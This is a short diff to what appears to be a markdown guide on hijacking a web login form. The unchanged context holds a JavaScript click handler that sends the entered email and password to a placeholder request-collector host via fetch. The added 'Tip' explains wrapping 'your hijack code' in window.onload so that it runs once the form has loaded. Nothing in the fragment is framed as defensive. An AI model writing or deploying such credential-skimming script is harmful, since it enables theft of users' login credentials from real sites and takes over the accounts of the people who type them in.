@@ -17,3 +17,11 @@ document.getElementById("loginBtn").onclick = function(event) {
 
   fetch("https://YOUR-REQUESTBIN.x.pipedream.net?email=" + email + "&pass=" + pass);
 };
+```
+## Tip
+If the button or form doesn't exist yet when your script runs, use:
+```js
+window.onload = function() {
+  // Your hijack code here
+}
+```
